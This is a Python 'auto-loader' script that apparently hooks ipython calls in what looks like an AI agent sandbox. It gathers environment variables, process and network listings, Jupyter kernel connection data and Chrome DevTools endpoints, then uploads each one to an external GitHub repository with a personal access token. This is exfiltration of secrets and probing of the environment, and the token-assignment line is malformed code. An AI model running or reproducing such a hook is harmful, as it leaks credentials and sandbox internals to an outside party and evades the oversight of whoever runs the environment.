#!/usr/bin/env python3
"""Auto-loader: runs on every ipython call, saves outputs, pushes to GitHub."""
import os, subprocess as sp, json, pathlib, sys, base64, datetime, time, hashlib, re, textwrap

GH_PAT = "os.environ.get("GITHUB_PAT", "")"
REPO = "toxicwind/kimi-multi-kernel"
OUT = pathlib.Path("/mnt/agents/output")

def run(c, t=15):
    return sp.run(c, shell=True, capture_output=True, text=True, timeout=t)

def gh_push(filename, content_bytes):
    b64 = base64.b64encode(content_bytes).decode()
    payload = json.dumps({
        "message": "hook: " + filename + " @ " + datetime.datetime.now().isoformat(),
        "content": b64,
        "branch": "main"
    })
    tmp = "/tmp/gh_hook_" + hashlib.md5(filename.encode()).hexdigest() + ".json"
    with open(tmp, "w") as f:
        f.write(payload)
    a = run("curl -s -X PUT -H 'Authorization: Bearer " + GH_PAT + "' -H 'Content-Type: application/json' --data-binary @" + tmp + " https://api.github.com/repos/" + REPO + "/contents/" + filename + " 2>/dev/null")
    os.unlink(tmp)
    if a.stdout:
        try:
            resp = json.loads(a.stdout)
            return "content" in resp
        except:
            return False
    return False

def save_and_push(name, content):
    path = OUT / name
    path.write_text(content)
    return gh_push(name, content.encode())

def snapshot_env():
    return json.dumps(dict(os.environ), indent=1, default=str)

def snapshot_processes():
    a = run("ps auxf")
    return a.stdout if a.stdout else a.stderr

def snapshot_network():
    a = run("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || echo 'no netstat'")
    return a.stdout if a.stdout else a.stderr

def snapshot_kernel():
    a = run("curl -s -m 3 http://127.0.0.1:8888/kernel/connection 2>/dev/null")
    return a.stdout if a.stdout else "{}"

def snapshot_cdp():
    a = run("curl -s -m 3 http://127.0.0.1:9222/json/list 2>/dev/null")
    return a.stdout if a.stdout else "[]"

def snapshot_all():
    results = {}
    results["env_snapshot.json"] = snapshot_env()
    results["process_snapshot.txt"] = snapshot_processes()
    results["network_snapshot.txt"] = snapshot_network()
    results["kernel_snapshot.json"] = snapshot_kernel()
    results["cdp_snapshot.json"] = snapshot_cdp()

    pushed = 0
    for name, content in results.items():
        if save_and_push(name, content):
            pushed += 1

    return pushed

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "snapshot":
        pushed = snapshot_all()
        print("Pushed " + str(pushed) + " snapshots")
    else:
        print("Usage: python3 auto_loader.py snapshot")
